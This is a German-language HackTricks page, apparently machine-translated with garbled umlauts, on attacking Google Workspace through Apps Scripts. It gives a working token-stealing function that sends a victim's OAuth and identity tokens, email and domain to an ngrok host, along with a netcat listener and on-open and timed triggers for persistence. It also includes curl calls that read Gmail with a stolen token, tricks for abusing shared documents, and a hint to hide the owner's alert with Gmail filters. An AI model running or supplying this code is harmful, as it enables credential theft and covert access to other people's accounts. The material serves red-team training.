# GWS - App Scripts

{% hint style="success" %}
Lernen & √ºben Sie AWS-Hacking: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys senden.

</details>
{% endhint %}

## App Scripts

App Scripts sind **Code, der ausgel√∂st wird, wenn ein Benutzer mit Editorberechtigung auf das Dokument zugreift, mit dem das App-Skript verkn√ºpft ist**, und nach **Akzeptieren der OAuth-Aufforderung**.\
Sie k√∂nnen auch so eingestellt werden, dass sie vom Besitzer des App-Skripts **zu einem bestimmten Zeitpunkt ausgef√ºhrt werden** (Persistenz).

### App-Skript erstellen

Es gibt mehrere M√∂glichkeiten, ein App-Skript zu erstellen, obwohl die h√§ufigsten **aus einem Google-Dokument (jeder Art)** und als **eigenst√§ndiges Projekt** sind:

<details>

<summary>Erstellen eines an einen Container gebundenen Projekts aus Google Docs, Sheets oder Slides</summary>

1. √ñffnen Sie ein Docs-Dokument, ein Sheets-Arbeitsblatt oder eine Slides-Pr√§sentation.
2. Klicken Sie auf **Erweiterungen** > **Google Apps Script**.
3. Klicken Sie im Skript-Editor auf **Unbenanntes Projekt**.
4. Geben Sie Ihrem Projekt einen Namen und klicken Sie auf **Umbenennen**.

</details>

<details>

<summary>Erstellen eines eigenst√§ndigen Projekts</summary>

Um ein eigenst√§ndiges Projekt aus Apps Script zu erstellen:

1. Gehen Sie zu [`script.google.com`](https://script.google.com/).
2. Klicken Sie auf **Neues Projekt hinzuf√ºgen**.
3. Klicken Sie im Skript-Editor auf **Unbenanntes Projekt**.
4. Geben Sie Ihrem Projekt einen Namen und klicken Sie auf **Umbenennen**.

</details>

<details>

<summary>Erstellen eines eigenst√§ndigen Projekts aus Google Drive</summary>

1. √ñffnen Sie [Google Drive](https://drive.google.com/).
2. Klicken Sie auf **Neu** > **Weitere** > **Google Apps Script**.

</details>

<details>

<summary>Erstellen eines an einen Container gebundenen Projekts aus Google Forms</summary>

1. √ñffnen Sie ein Formular in Google Forms.
2. Klicken Sie auf Mehr more\_vert > **Skript-Editor**.
3. Klicken Sie im Skript-Editor auf **Unbenanntes Projekt**.
4. Geben Sie Ihrem Projekt einen Namen und klicken Sie auf **Umbenennen**.

</details>

<details>

<summary>Erstellen eines eigenst√§ndigen Projekts mithilfe des clasp-Befehlszeilentools</summary>

`clasp` ist ein Befehlszeilentool, mit dem Sie Apps-Script-Projekte von einem Terminal aus erstellen, abrufen/pushen und bereitstellen k√∂nnen.

Siehe den [Leitfaden zur Befehlszeilenschnittstelle mit `clasp`](https://developers.google.com/apps-script/guides/clasp) f√ºr weitere Details.

</details>

## App-Skript-Szenario <a href="#create-using-clasp" id="create-using-clasp"></a>

### Google-Tabelle mit App-Skript erstellen

Beginnen Sie mit der Erstellung eines App-Skripts, meine Empfehlung f√ºr dieses Szenario ist die Erstellung einer Google-Tabelle und gehen Sie zu **`Erweiterungen > App-Skripte`**, dies wird ein **neues App-Skript f√ºr Sie √∂ffnen, das mit der Tabelle verkn√ºpft ist**.

### Token leaken

Um Zugriff auf das OAuth-Token zu gew√§hren, m√ºssen Sie auf **`Dienste hinzuf√ºgen +` klicken und Bereiche wie** hinzuf√ºgen:

* **AdminDirectory**: Zugriff auf Benutzer und Gruppen des Verzeichnisses (wenn der Benutzer √ºber ausreichende Berechtigungen verf√ºgt)
* **Gmail**: Um auf Gmail-Daten zuzugreifen
* **Drive**: Um auf Drive-Daten zuzugreifen
* **Google Sheets API**: Damit es mit dem Trigger funktioniert

Um die **ben√∂tigten Bereiche** selbst zu √§ndern, k√∂nnen Sie zu den Projekteinstellungen gehen und aktivieren: **`"appsscript.json"`-Manifestdatei im Editor anzeigen**.

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

Um die Anfrage abzufangen, k√∂nnen Sie einfach Folgendes ausf√ºhren:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Berechtigungen, die zur Ausf√ºhrung des App-Skripts angefordert werden:

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Wenn eine externe Anfrage gestellt wird, wird die OAuth-Aufforderung auch um **Berechtigung zur Erreichung externer Endpunkte** bitten.
{% endhint %}

### Trigger erstellen

Sobald die App gelesen wurde, klicken Sie auf **‚è∞ Trigger**, um einen Trigger zu erstellen. W√§hlen Sie als **Funktion** **`getToken`** aus, die bei Bereitstellung **`Head`** ausgef√ºhrt wird. W√§hlen Sie als Ereignisquelle **`Von Tabellenkalkulation`** und als Ereignistyp **`Beim √ñffnen`** oder **`Beim Bearbeiten`** (je nach Bedarf) und speichern Sie.

Beachten Sie, dass Sie die **Ausf√ºhrungen der App-Skripts im Register Ausf√ºhrungen √ºberpr√ºfen** k√∂nnen, wenn Sie etwas debuggen m√∂chten.

### Teilen

Um das **App-Skript auszul√∂sen**, muss das Opfer eine Verbindung mit **Editorzugriff** herstellen.

{% hint style="success" %}
Das **Token**, das zur Ausf√ºhrung des **App-Skripts** verwendet wird, ist das des **Erstellers des Triggers**, auch wenn die Datei von anderen Benutzern als Editor ge√∂ffnet wird.
{% endhint %}

### Missbrauch von "Mit mir geteilten" Dokumenten

{% hint style="danger" %}
Wenn Ihnen jemand ein Dokument mit App-Skripts und einem Trigger, der den Head des App-Skripts verwendet (keine feste Bereitstellung), geteilt hat, k√∂nnen Sie den App-Skript-Code √§ndern (zum Beispiel die Funktionen zum Stehlen von Token hinzuf√ºgen), darauf zugreifen und das **App-Skript wird mit den Berechtigungen des Benutzers ausgef√ºhrt, der das Dokument mit Ihnen geteilt hat**! (Beachten Sie, dass das OAuth-Token des Eigent√ºmers die Zugriffsbereiche haben wird, die bei der Erstellung des Triggers angegeben wurden).

Eine **Benachrichtigung wird an den Skriptersteller gesendet, die darauf hinweist, dass jemand das Skript ge√§ndert hat** (Wie w√§re es, Gmail-Berechtigungen zu verwenden, um einen Filter zu generieren, um den Alarm zu verhindern?)
{% endhint %}

{% hint style="success" %}
Wenn ein **Angreifer die Berechtigungsbereiche des App-Skripts √§ndert**, werden die Aktualisierungen **nicht auf das Dokument angewendet**, bis ein **neuer Trigger** mit den √Ñnderungen erstellt wird. Daher wird ein Angreifer nicht in der Lage sein, das Token des Eigent√ºmers mit mehr Bereichen zu stehlen, als er im Trigger festgelegt hat.
{% endhint %}

### Kopieren anstelle von Teilen

Wenn Sie einen Link erstellen, um ein Dokument zu teilen, wird ein Link √§hnlich diesem erstellt: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Wenn Sie das Ende **"/edit"** in **"/copy"** √§ndern, wird Google Sie fragen, ob Sie eine Kopie des Dokuments erstellen m√∂chten:

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

Wenn der Benutzer eine Kopie erstellt und darauf zugreift, werden sowohl die **Inhalte des Dokuments als auch die App-Skripts kopiert**, jedoch werden die **Trigger nicht kopiert**, daher **wird nichts ausgef√ºhrt**.

### Als Webanwendung teilen

Beachten Sie, dass es auch m√∂glich ist, ein App-Skript als Webanwendung zu teilen (im Editor des App-Skripts als Webanwendung bereitstellen), aber es wird eine Warnung wie diese angezeigt:

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

Gefolgt von der **typischen OAuth-Aufforderung**, die um die ben√∂tigten Berechtigungen bittet.

### Testen

Sie k√∂nnen ein gesammeltes Token testen, um E-Mails aufzulisten, mit:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Kalender des Benutzers auflisten:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App-Skript als Persistenz

Eine Option f√ºr Persistenz w√§re es, **ein Dokument zu erstellen und einen Trigger f√ºr die Funktion getToken hinzuzuf√ºgen** und das Dokument mit dem Angreifer zu teilen, sodass jedes Mal, wenn der Angreifer die Datei √∂ffnet, **der Token des Opfers exfiltriert wird**.

Es ist auch m√∂glich, ein App-Skript zu erstellen und es alle X Zeit auszul√∂sen (zum Beispiel alle Minute, Stunde, Tag...). Ein Angreifer, der **Anmeldeinformationen kompromittiert hat oder eine Sitzung eines Opfers hat, k√∂nnte einen zeitgesteuerten App-Skript-Trigger einrichten und jeden Tag einen sehr privilegierten OAuth-Token leaken**:

Erstellen Sie einfach ein App-Skript, gehen Sie zu Triggern, klicken Sie auf Trigger hinzuf√ºgen und w√§hlen Sie als Ereignisquelle Zeitgesteuert und w√§hlen Sie die Optionen aus, die am besten zu Ihnen passen:

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Dies wird eine Sicherheitswarnungs-E-Mail und eine Push-Nachricht an Ihr Mobilger√§t erstellen, die Sie √ºber dies informiert.
{% endhint %}

### Umgehung der nicht √ºberpr√ºften Aufforderung f√ºr freigegebenes Dokument

Dar√ºber hinaus, wenn jemand Ihnen ein Dokument mit **Editorzugriff freigegeben** hat, k√∂nnen Sie **App-Skripte im Dokument generieren** und der **BESITZER (Ersteller) des Dokuments wird der Besitzer des App-Skripts** sein.

{% hint style="warning" %}
Das bedeutet, dass der **Ersteller des Dokuments als Ersteller jedes App-Skripts** erscheinen wird, das jemand mit Editorzugriff darin erstellt.

Das bedeutet auch, dass das **App-Skript vom Workspace-Umfeld des Erstellers des Dokuments vertraut wird**.
{% endhint %}

{% hint style="danger" %}
Das bedeutet auch, dass wenn ein **App-Skript bereits existierte** und Personen **Zugriff gew√§hrt haben**, jeder mit **Editor**-Berechtigung auf dem Dokument es **√§ndern und diesen Zugriff missbrauchen kann**.\
Um dies auszunutzen, ben√∂tigen Sie auch Personen, die das App-Skript ausl√∂sen. Ein weiterer Trick besteht darin, das Skript als Web-App zu **ver√∂ffentlichen**. Wenn die **Personen**, die bereits **Zugriff** auf das App-Skript gew√§hrt haben, die Webseite aufrufen, wird das **App-Skript ausgel√∂st** (dies funktioniert auch mit `<img>`-Tags).
{% endhint %}

{% hint style="success" %}
Lernen Sie & √ºben Sie AWS-Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lernen Sie & √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
{% endhint %}
